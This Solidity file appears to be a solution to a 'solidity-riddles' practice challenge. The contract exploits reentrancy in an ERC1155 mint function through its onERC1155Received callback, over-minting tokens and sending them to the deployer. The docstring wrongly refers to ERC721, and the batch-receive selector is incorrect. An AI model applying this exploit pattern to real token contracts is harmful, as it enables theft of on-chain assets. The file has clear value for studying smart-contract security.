// SPDX-License-Identifier: MIT
pragma solidity >=0.8.15;

import {Overmint1_ERC1155} from "../solidity-riddles/Overmint1-ERC1155.sol";
import {ERC1155, IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";

/**
 * @title AttackOvermint1
 * @dev This contract demonstrates an attack on the Overmint1 contract using onERC721Received reentrancy.
 */
contract AttackOvermint1_ERC1155 is IERC1155Receiver {
    address private immutable overmint1ERC115Add;
    address private immutable attaker;

    constructor(address _overmint1ERC115Add) {
        overmint1ERC115Add = _overmint1ERC115Add;
        attaker = msg.sender;
    }

    // The mint function of Overmin1-1155 is vulnerable to reentrancy attack. Ensure to follow the checks-effects-interactions pattern and consider employing reentrancy guards when interacting with untrusted contracts.
    function exploitOvermint1155() external {
        Overmint1_ERC1155 overmint1155 = Overmint1_ERC1155(overmint1ERC115Add);
        overmint1155.mint(1, "");
        uint256[] memory ids = new uint256[](1); // Define an array for token IDs
        uint256[] memory values = new uint256[](1); // Define an array for token amounts
        ids[0] = 1;
        values[0] = 5;
        overmint1155.safeBatchTransferFrom(address(this), attaker, ids, values, "");
        // for (uint256 i = 1; i < 6; ++i) {
        //     overmint1155.safeTransferFrom(address(this), attaker, i);
        // }
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata)
        external
        override
        returns (bytes4 selector)
    {
        Overmint1_ERC1155 overmint1155 = Overmint1_ERC1155(overmint1ERC115Add);
        if (overmint1155.balanceOf(address(this), 1) < 5) {
            overmint1155.mint(1, "");
        }
        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return IERC1155Receiver.onERC1155Received.selector;
    }

    function supportsInterface(bytes4 interfaceId) external view override returns (bool) {}
}
